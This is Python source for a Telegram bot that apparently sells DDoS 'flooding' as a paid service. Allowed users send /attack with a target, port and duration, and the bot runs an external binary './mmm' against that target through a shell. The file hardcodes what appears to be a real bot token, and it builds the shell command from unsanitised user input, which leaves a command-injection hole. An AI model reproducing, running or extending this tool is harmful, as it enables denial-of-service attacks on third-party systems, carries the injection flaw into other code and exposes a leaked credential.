import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7569800573:AAGgwAtuE2KQuzy0o1dGhOlHXrJ2GPYOUz4')

# Admin user IDs
admin_id = {"6140583954"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} added successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"User {user_to_remove} removed."
            else:
                response = f"User {user_to_remove} not found."
        else:
            response = "Usage: /remove <userid>"
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:
            target, port, time = command[1], int(command[2]), int(command[3])
            if time > 381:
                response = "Error: Time interval must be less than 380."
            else:
                log_command(user_id, target, port, time)
                full_command = f"./mmm {target} {port} {time} 100"
                subprocess.run(full_command, shell=True)
                response = "Flooding Complete."
        else:
            response = "Usage: /attack <target> <port> <time>"
    else:
        response = "❌ Access expired or unauthorized : buy @spoliator_personal"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''
/attack : Start an attack
/add <userId> : Add a user
/remove <userId> : Remove a user
/id : Show your Telegram ID
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = "[ Flooding not running ]\nUse /help to see commands."
    bot.reply_to(message, response)

# Print confirmation message when script starts
print("Bot is running successfully...")  

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")